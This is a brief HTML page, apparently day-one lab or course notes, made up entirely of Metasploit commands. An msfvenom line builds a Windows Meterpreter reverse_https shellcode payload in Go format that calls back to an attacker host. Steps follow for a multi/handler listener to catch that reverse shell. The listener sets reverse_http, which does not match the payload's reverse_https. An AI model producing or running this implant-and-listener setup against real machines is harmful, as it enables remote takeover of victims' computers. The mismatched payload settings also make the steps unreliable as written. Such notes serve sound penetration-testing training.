<div align="center">
  <h1>Day 01</h1>
  <br/>
</div>

<h2>Metasploit commands:</h2>
<h3>Shellcode generation:</h3>
<ul>
<li>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.61.38 LPORT=9999 -f go</li>
</ul>

<h3>Listener:</h3>
<ol>
<li>msfconsole</li>
<li>exploit/multi/handler</li>
<li>set payload windows/x64/meterpreter/reverse_http</li>
<li>set LHOST <Kali IP address></li>
<li>set LPORT <non-standard port></li>
<li>run</li>
</ol>